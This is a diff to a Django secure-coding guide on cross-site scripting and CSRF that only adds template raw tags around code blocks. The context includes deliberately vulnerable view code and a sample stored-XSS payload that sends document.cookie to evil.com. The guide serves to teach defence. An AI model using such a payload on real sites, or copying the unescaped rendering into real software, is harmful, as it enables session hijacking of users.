@@ -275,6 +275,7 @@ There are three main types:
 
 **VULNERABLE code -- Stored XSS:**
 
+{% raw %}
 ```python
 # DANGEROUS: Rendering user input without escaping
 # views.py
@@ -290,9 +291,11 @@ def post_comment(request):
 # If an attacker posts: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
 # Every user who views the comments page will have their cookies stolen.
 ```
+{% endraw %}
 
 **SECURE code -- Proper output encoding:**
 
+{% raw %}
 ```python
 # SAFE: Django templates auto-escape by default
 # views.py -- same as above, but the template is different
@@ -314,6 +317,7 @@ def post_comment(request):
     Comment.objects.create(user=request.user, text=clean_text)
     return redirect("/comments/")
 ```
+{% endraw %}
 
 **VULNERABLE code -- Reflected XSS:**
 
@@ -329,6 +333,7 @@ def search(request):
 
 **SECURE code -- Escaped output:**
 
+{% raw %}
 ```python
 # SAFE: Use Django's template engine which auto-escapes
 from django.shortcuts import render
@@ -349,6 +354,7 @@ def search(request):
     safe_query = escape(query)
     return HttpResponse(f"<h1>Search results for: {safe_query}</h1>")
 ```
+{% endraw %}
 
 **Content Security Policy (CSP)** is a critical defense against XSS. Even if an XSS vulnerability exists, a strong CSP can prevent the injected script from executing:
 
@@ -410,6 +416,7 @@ def transfer_money(request):
 
 **SECURE code -- Django CSRF protection:**
 
+{% raw %}
 ```python
 # SAFE: Django's built-in CSRF protection
 # settings.py
@@ -445,6 +452,7 @@ MIDDLEWARE = [
 #     body: JSON.stringify({to: '...', amount: 100}),
 # });
 ```
+{% endraw %}
 
 **SECURE code -- SameSite cookie attribute:**
 
